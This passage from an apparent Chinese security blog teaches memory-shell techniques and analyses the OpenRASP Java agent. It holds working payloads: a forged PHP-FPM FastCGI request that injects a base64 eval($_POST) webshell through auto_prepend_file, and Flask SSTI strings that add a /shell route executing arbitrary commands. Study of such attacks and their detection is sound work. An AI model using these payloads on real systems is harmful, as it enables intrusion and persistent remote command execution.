&#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php。在PHP-FPM中有两个特殊的环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p><p>php-fpm默认监听9000端口，假设我们可以跳过nginx直接与php-fpm进行通信，那我们是不是就可以伪造fastcgi协议数据包从而改变PHP里的配置项，例如我们之前提到的auto_prepend_file。</p><p>构造如下环境变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?x=x&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?x=x&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = &quot;data:;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=&quot;&#x27;,</span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着自己改改p牛的脚本运行就注入成功了：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><h2 id="Python-Flask-内存马"><a href="#Python-Flask-内存马" class="headerlink" title="Python Flask 内存马"></a>Python Flask 内存马</h2><p>Flask&#x2F;jinja2 SSTI漏洞过于基础就不再介绍了，直接给出漏洞环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    person = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>flask版本为2.0.3：</p><p><img src="https://pic.imgdb.cn/item/64d2714f1ddac507cc0dc856.jpg"></p><h3 id="注入流程分析"><a href="#注入流程分析" class="headerlink" title="注入流程分析"></a>注入流程分析</h3><p>首先我们先看一下payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>url_for是Flask的一个内置函数, 通过Flask内置函数可以调用其<code>__globals__</code>属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的modules，比如<code>__builtins__</code>模块。在<code>__builtins__</code>模块中, <code>Python</code>在启动时就直接为我们导入了很多内建函数，如eval，exec等。让我们看一下python中eval函数是怎样使用的：</p><p><img src="https://pic.imgdb.cn/item/64d271011ddac507cc0d09d9.jpg" alt="image-20230808234956583"></p><p>给出以下例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namespace = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&quot;a + b&quot;</span>, namespace)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>可以看到，eval函数是在指定命名空间中执行表达式，a+b即2+3。</p><p>那在给出的payload中，以下为表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">    <span class="string">&#x27;/shell&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>, </span><br><span class="line">    <span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)).read()</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>以下代码即是我们制定的命名空间：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>current_app</code>是一个本地代理，它的类型是<code>werkzeug.local.LocalProxy</code>，它所代理的即是我们的<code>app</code>对象：</p><p><img src="https://pic.imgdb.cn/item/64d2710e1ddac507cc0d283f.jpg" alt="image-20230808185151749"></p><p>只在请求线程内存在，它的生命周期就是在应用上下文里。离开了应用上下文，<code>current_app</code>一样无法使用。</p><p>当一个网页请求来以后，Flask会实例化对象app，执行<code>__call__</code>：</p><p><img src="https://pic.imgdb.cn/item/64d271191ddac507cc0d41f8.jpg" alt="image-20230808222142861"></p><p>之后调用<code>flask.app.Flask.wsgi_app</code>：</p><p><img src="https://pic.imgdb.cn/item/64d271641ddac507cc0df993.jpg" alt="image-20230808223208880"></p><p>此处调用了<code>flask.app.Flask.request_context</code>创建一个请求上下文<code>RequestContext</code>类型的对象，：</p><p><img src="https://pic.imgdb.cn/item/64d2716e1ddac507cc0e17a9.jpg" alt="image-20230808223251476"></p><p>其需接收<code>werkzeug</code>中的<code>environ</code>对象为参数。<code>werkzeug</code>是Flask所依赖的WSGI函数库。接下来又调用了push()方法：</p><p><img src="https://pic.imgdb.cn/item/64d271771ddac507cc0e2f93.jpg" alt="image-20230808223402158"></p><p>这是为什么？<code>request_context</code>方法已经创建了请求上下文，为什么还要调用<code>push</code>和<code>pop</code>方法呢？这就是Flask关于上下文实现的关键了。对于Flask Web应用来说，每个请求就是一个独立的线程。请求之间的信息要完全隔离，避免冲突，这就需要使用本地线程环境(ThreadLocal)，这个概念在其他语言如Java中也有。<code>ctx.push()</code>方法，会将当前请求上下文，压入<code>flask._request_ctx_stack</code>的栈中，这个<code>_request_ctx_stack</code>是内部对象。同时这个<code>_request_ctx_stack</code>栈是个ThreadLocal对象。也就是<code>flask._request_ctx_stack</code>看似全局对象，其实每个线程的都不一样。请求上下文压入栈后，再次访问其都会从这个栈的顶端通过<code>_request_ctx_stack.top</code>来获取，所以取到的永远是只属于本线程中的对象，这样不同请求之间的上下文就做到了完全隔离。请求结束后，线程退出，ThreadLocal线程本地变量也随即销毁，<code>ctx.pop()</code>用来将请求上下文从栈里弹出，避免内存无法回收。</p><p>知道了app和_request_ctx_stack是什么，我们就来看看eval中的表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">    <span class="string">&#x27;/shell&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>, </span><br><span class="line">    <span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)).read()</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>跟进装饰器<code>@app.route(&#39;&lt;url&gt;&#39;)</code>的代码，可以看到其本质上也调用了flask对象的add_url_rule()方法：</p><p><img src="https://pic.imgdb.cn/item/64d271871ddac507cc0e53d3.jpg" alt="image-20230808224327817"></p><p>以下是一个不使用装饰器创建路由的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/index&#x27;</span>,endpoint=<span class="string">&#x27;index&#x27;</span>,view_func=index)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是这三个参数的解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">:param rule: The URL rule string.</span><br><span class="line">:param endpoint: The endpoint name to associate with the rule</span><br><span class="line">    and view function. Used when routing and building URLs.</span><br><span class="line">    Defaults to ``view_func.__name__``.</span><br><span class="line">:param view_func: The view function to associate with the</span><br><span class="line">    endpoint name.</span><br></pre></td></tr></table></figure><p>因此payload中add_url_rule()方法的每一个参数的意思也就知道了，主要看payload中的第三个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br></pre></td></tr></table></figure><p>通过<strong>import</strong>模块导入os并执行os.popen(cmd).read()。<code>_request_ctx_stack.top</code>拿到<code>_request_ctx_stack</code>的栈顶元素，即当前请求上下文，之后从当前请求上下文获取request对象，通过request.args.get()的方法拿到cmd参数的值，如果cmd参数为空，就设为whoami。也就是说默认执行whoami。</p><h3 id="payload变形"><a href="#payload变形" class="headerlink" title="payload变形"></a>payload变形</h3><p>至此，整个payload的脉络也梳理清楚了。那仔细想想还有什么办法对这个payload进行一些改变呢？以request对象为例，刚刚提到，在payload中，获取request对象是通过从全局变量中获取_request_ctx_stack，并获取它的栈顶元素及请求上下文，而请求上下文的request属性即是我们的需要的request对象。但在我们其实可以在<code>url_for.__globals__</code>就找到此次请求的request对象，而不用通过这种方式来获取：</p><p><img src="https://pic.imgdb.cn/item/64d271941ddac507cc0e727e.jpg" alt="image-20230808235310632"></p><p>因此payload可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>以下是执行结果：</p><p><img src="https://pic.imgdb.cn/item/64d2719f1ddac507cc0e8cf0.jpg" alt="image-20230809000443773"></p><p>那当前app对象还能从哪里获取呢？可以从_app_ctx_stack的栈顶元素中获取应用上下文，在应用上下文中有app属性，即是我们需要的app对象：</p><p><img src="https://pic.imgdb.cn/item/64d271b01ddac507cc0eb2f5.jpg" alt="image-20230808235717822"></p><p>因此payload可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;_app_ctx_stack&#x27;].top.app&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>其实通过以下方式也可以获得当前的app对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flashed_messages.__globals__[&#x27;current_app&#x27;]</span><br></pre></td></tr></table></figure><p>获取当前的request对象和app对象一定不只是这几种方式，大家可以继续补充。</p><h3 id="查杀与检测"><a href="#查杀与检测" class="headerlink" title="查杀与检测"></a>查杀与检测</h3><p>flask&#x2F;jinja2 SSTI漏洞在实际攻防场景其实并不常见，因此个人认为这种内存马只要注意不要出现SSTI漏洞就可以了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为目前在实习的原因，不像以前一样有很多时间，这篇文章断断续续写了一周，本以为用不了这么长时间。以前觉得内存马相关内容的东西太多了，即使目前写了过万字也感觉有很多的地方有待补充，比如Java内存马的种类还差很多种，以及这些内存马的查杀方式，关于查杀方式目前也只是写了Tomcat-Servlet内存马的 查杀方式。缺失的这些有空再写吧，没办法，这就是懒狗的日常，嘻嘻。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://tttang.com/archive/1775">https://tttang.com/archive/1775</a></p><p><a href="https://xz.aliyun.com/t/11566">https://xz.aliyun.com/t/11566</a></p><p><a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p><p><a href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Java RASP的一些研究</title>
      <link href="/2023/08/06/JavaRASP/"/>
      <url>/2023/08/06/JavaRASP/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近分析了百度开源的OpenRASP这款RASP产品的启动流程及Hook流程（Java RASP部分），感觉自己对于RASP产品有了更深的理解。本篇文章将会以OpenRASP为例，介绍RASP产品的部署、检测原理及bypass方法，并尝试自己完成一个RASP的简单实现——取名为CloseRASP。因为笔者水平有限，因此这篇文章可能干货不多，如有错误或不足，希望师傅们斧正。</p><h2 id="RASP介绍"><a href="#RASP介绍" class="headerlink" title="RASP介绍"></a>RASP介绍</h2><p>介绍RASP之前，我们先看看什么是WAF？</p><blockquote><p>WAF（Web 应用程序防火墙）通过过滤和监控 Web 应用程序与互联网之间的 HTTP 流量来帮助保护 Web 应用程序。它通常可以保护 Web 应用程序，使其免受跨站点伪造、跨站点脚本 (XSS)、文件包含、SQL 注入及其他一些攻击的影响。</p></blockquote><p>很多时候我们在进行攻击时遇到的都是基于流量规则对攻击行为进行过滤的WAF，WAF相比RASP误报率高，绕过率高，且市面上也有很多针对不同waf的绕过方式。而RASP是一种运行时应用程序自我保护的技术，全称“Runtime application self-protection”。它是通过JavaAgent利用Instrumentation在指定的class加载之后，调用指定的ClassFileTransformer实现类的transform方法，通过使用ASM（或者其他字节码修改框架）技术来hook目标class的method，在方法的开头或结尾插入检测攻击的代码，之后将hook好的字节码返回给transformer从而加载到JVM中。因此可以说JavaAgent就是Java RASP技术的基础。（建议读者先了解JavaAgent及Javassist再阅读本文）</p><h2 id="OpenRASP研究"><a href="#OpenRASP研究" class="headerlink" title="OpenRASP研究"></a>OpenRASP研究</h2><p>OpenRASP 抛弃了传统防火墙依赖请求特征检测攻击的模式，创造性的使用RASP技术（应用运行时自我保护），直接注入到被保护应用的服务中提供函数级别的实时防护，可以在不更新策略以及不升级被保护应用代码的情况下检测&#x2F;防护未知漏洞，尤其适合大量使用开源组件的互联网应用以及使用第三方集成商开发的金融类应用。我们先看看OpenRASP在Tomcat中是怎样手动安装的：</p><p><img src="https://pic.imgdb.cn/item/64cfd5341ddac507cc8231bd.jpg" alt="image-20230805164731893"></p><p>在OpenRASP中除了RaspInstall.jar这个用来安装OpenRASP的jar包外，还有rasp.jar和rasp-engine.jar这两个jar包。可以看到在Tomcat中手动安装OpenRASP的话，需要增加-javaagent项设置为rasp.jar。老惯例，先看看MAINFEST.MF，以下是rasp.jar的MAINFEST.MF文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Build-Time: 2022-01-28T09:49:33Z</span><br><span class="line">Last-Commit-User-Email: CaledoniaProject@users.noreply.github.com</span><br><span class="line">Built-By: root</span><br><span class="line">Premain-Class: com.baidu.openrasp.Agent</span><br><span class="line">Created-By: Apache Maven 3.2.3</span><br><span class="line">Git-Branch: master</span><br><span class="line">Git-Commit: a0634d6</span><br><span class="line">Last-Commit-User-Name: CaledoniaProject</span><br><span class="line">Build-Jdk: 1.6.0_45</span><br><span class="line">Project-Version: 1.3.7</span><br><span class="line">Agent-Class: com.baidu.openrasp.Agent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Main-Class: com.baidu.openrasp.Agent</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们只关心Premain-Class、Agent-Class、Can-Redefine-Classes、Main-Class和Can-Retransform-Classes这5个配置。可以看到Main-Class是com.baidu.openrasp.Agent，若是执行这个rasp.jar，代码将从com.baidu.openrasp.Agent#main开始。Premain-Class也是com.baidu.openrasp.Agent，因为设置了-javaagent项，因此若运行利用Tomcat部署Web项目时会首先执行com.baidu.openrasp.Agent#premain。Can-Redefine-Classes和Can-Retransform-Classes这两个配置项因为要重新定义class必然设置为true不必说。Agent-Class指定的也是com.baidu.openrasp.Agent，那么当attach目标class的时候就会执行com.baidu.openrasp.Agent#agentmain。</p><h3 id="OpenRASP启动流程分析"><a href="#OpenRASP启动流程分析" class="headerlink" title="OpenRASP启动流程分析"></a>OpenRASP启动流程分析</h3><p>在IDEA调试时，可以在右上角的Tomcat配置中加上VM Options，通过-javaagent项指定rasp.jar。因为配置了<code>-javaagent</code>，因此首先进入com.baidu.openrasp.Agent#premain：</p><p><img src="https://pic.imgdb.cn/item/64cfd5541ddac507cc826f2e.jpg" alt="image-20230805165633563"></p><p>跟进init方法：</p><p><img src="https://pic.imgdb.cn/item/64cfd5621ddac507cc828ca6.jpg" alt="image-20230805165926450"></p><p>以下是JarFileHelper的addJarToBootstrap方法：</p><p><img src="https://pic.imgdb.cn/item/64cfd5731ddac507cc82af30.jpg" alt="image-20230805170651161"></p><p>这里通过Instrumentation的<code>appendToBootstrapClassLoaderSearch</code>方法，把rasp.jar包放到Bootstrap ClassLoader的搜索路径。解释一下为什么这样做，因为java的双亲委派机制，我们需要将<code>rasp.jar</code>包加入到了<code>BootStrapClassLoader</code>下，否则当我们需要hook像 java.io.File或者java.lang.ProcessImpl 这样由 <code>BootstrapClassLoader</code> 加载的类的时候，就无法检测到了。因此将 rasp.jar 添加到 <code>BootstrapClassLoader</code> 的ClassPath下，收到类加载委派任务时，就能通过该classpath加载到rasp.jar的所有类了，那么，也就意味着，任何一个类加载器中的任何一个类，都能通过显式或者隐式加载，加载到rasp.jar中的类。</p><p>之后调用了ModuleLoader.load()，这个函数的作用是用来加载和初始化引擎模块，即之前提到的rasp-engine.jar，跟进一下：</p><p><img src="https://pic.imgdb.cn/item/64cfd5811ddac507cc82ce9f.jpg" alt="image-20230805171655179"></p><p>这里创建了一个ModuleLoader实例，继续跟进：</p><p><img src="https://pic.imgdb.cn/item/64cfd58f1ddac507cc82ede5.jpg" alt="image-20230805171740140"></p><p>从函数名就可以知道这个<code>setStartupOptionForJboss</code>函数是用来为Jboss设置一些起始选项的，跟进一下：</p><p><img src="https://pic.imgdb.cn/item/64cfd59c1ddac507cc830933.jpg" alt="image-20230805172119071"></p><p>这里通过获取到系统类加载器加载字节码class的路径后，判断是否有jboss-modules.jar，很明显，我们使用Tomcat没有这个jar包。若判断是Jboss中间件的话，会调用setSystemProperty函数设置相关属性和预加载包：</p><p><img src="https://pic.imgdb.cn/item/64cfd5ad1ddac507cc83293c.jpg" alt="image-20230805172333798"></p><p>之后继续执行：</p><p><img src="https://pic.imgdb.cn/item/64cfd5b71ddac507cc833e67.jpg" alt="image-20230805172428128"></p><p>创建了一个ModuleContainer实例，传入了包名rasp-engine.jar，进入ModuleContainer的构造函数：</p><p><img src="https://pic.imgdb.cn/item/64cfd5c31ddac507cc835809.jpg" alt="image-20230805172647805"></p><p>首先创建一个JarFile对象指向rasp-engine.jar文件，然后获取jar包中的MAINFEST.MF文件中的属性，将Rasp-Module-Name的值赋值给this.moduleName，将Rasp-Module-Class的值赋值给moduleEnterClassName。Rasp-Module-Class的值是com.baidu.openrasp.EngineBoot：</p><p><img src="https://pic.imgdb.cn/item/64cfd5ce1ddac507cc836e26.jpg" alt="image-20230805173137167"></p><p>之后将com.baidu.openrasp.EngineBoot实例化赋值给this.module：</p><p><img src="https://pic.imgdb.cn/item/64cfd5db1ddac507cc83882e.jpg" alt="image-20230805173119508"></p><p>代码中是通过ModuleLoader.moduleClassLoader来加载com.baidu.openrasp.EngineBoot的，而moduleClassLoader在ModuleLoader类中的static块中有所定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader systemClassLoader;</span><br><span class="line"><span class="keyword">for</span>(systemClassLoader = ClassLoader.getSystemClassLoader(); systemClassLoader.getParent() != <span class="literal">null</span> &amp;&amp; !systemClassLoader.getClass().getName().equals(<span class="string">&quot;sun.misc.Launcher$ExtClassLoader&quot;</span>); systemClassLoader = systemClassLoader.getParent()) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">moduleClassLoader = systemClassLoader;</span><br></pre></td></tr></table></figure><p>扩展类加载器的父类加载器为启动类加载器，即Bootstrap ClassLoader，因此moduleClassLoader是启动类加载器，这里需要记一下。之后ModuleContainer的构造方法结束，继续执行com.baidu.openrasp.ModuleContainer#start，以下是该方法：</p><p><img src="https://pic.imgdb.cn/item/64cfd5e81ddac507cc83a490.jpg" alt="image-20230805173319080"></p><p>调用了com.baidu.openrasp.EngineBoot的start方法，在该方法中进行了：输出Banner信息，加载V8引擎、初始化插件系统、配置核查、初始化字节码转换模块、初始化云管理模块等操作，我们跟进一下：</p><p><img src="https://pic.imgdb.cn/item/64cfd5f31ddac507cc83bb5c.jpg" alt="image-20230805173434615"></p><p>首先输出了Banner，我们可以在运行日志中看到：</p><p><img src="https://pic.imgdb.cn/item/64cfd5fe1ddac507cc83d001.jpg" alt="image-20230805173518945"></p><p>之后执行了<code>Loader.load();</code>，跟进一下：</p><p><img src="https://pic.imgdb.cn/item/64cfd60b1ddac507cc83ecc5.jpg" alt="image-20230805174227846"></p><p><img src="https://pic.imgdb.cn/item/64cfd6151ddac507cc840142.jpg" 